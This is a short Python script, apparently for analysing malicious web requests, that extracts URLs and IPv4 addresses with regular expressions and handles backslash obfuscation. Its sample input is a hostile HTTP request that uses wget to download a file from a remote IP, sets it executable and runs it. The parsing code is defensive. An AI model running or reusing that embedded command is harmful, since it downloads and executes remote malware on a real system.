import re

myString = "GET /shell?cd /tmp;rm -rf b;wget http:/\\x5C/205.185.115.72/b;wget ftp:/\\x5C/2001:0db8:85a3:0000:0000:8a2e:0370:7334/b;chmod 777 b;sh b;rm -rf b HTTP/1.1"

# Original regex pattern found at: https://gist.github.com/uogbuji/705383
URL_REGEX = r'\b((?:(ftp|https?):?/?/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:\'\"\\\/.,<>?\xab\xbb\u201c\u201d\u2018\u2019])(?=;))'

def url_parser(input_str):
    """
    Parses a string for URLs and returns a list.
    Method accounts for some obfuscation such 
    as backslashes and unicode hex character codes

    Args:
        input_str (String): The string that may coontain a URL

    Returns:
        [List]: A list of URLs
    """
    input_str = input_str.replace("\\/", "/").encode().decode('unicode_escape')
    urls = re.findall(URL_REGEX, input_str)

    if urls:
        # Remove any backslashes from URL
        return [url[0].replace('\\','') for url in urls]

def ip_parser(input_str):
    """
    Parses a string for IPv4 addresses and returns a list

    Args:
        input_str (String): The string that may coontain IP Addresses

    Returns:
        [List]: A list of IPv4 Addresses
    """
    return re.findall(r'[0-9]+(?:\.[0-9]+){3}', input_str)

print(ip_parser(myString))